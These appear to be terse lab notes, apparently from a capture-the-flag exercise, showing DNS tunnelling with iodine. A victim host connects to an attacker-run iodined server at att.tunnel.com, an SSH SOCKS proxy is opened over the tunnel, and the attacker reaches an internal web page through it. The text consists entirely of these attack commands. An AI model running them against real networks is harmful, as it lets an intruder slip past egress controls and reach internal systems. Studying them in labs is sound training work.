**Attacker**
 
	 sudo iodined -f -c -P thmpass 10.1.1.1/24 att.tunnel.com      

**Victim**

	sudo iodine -P thmpass att.tunnel.com 
	ssh thm@10.1.1.2 -4 -f -N -D 1080
	
**Attacker**

	proxychains curl http://192.168.0.100/demo.php
	#OR
	curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
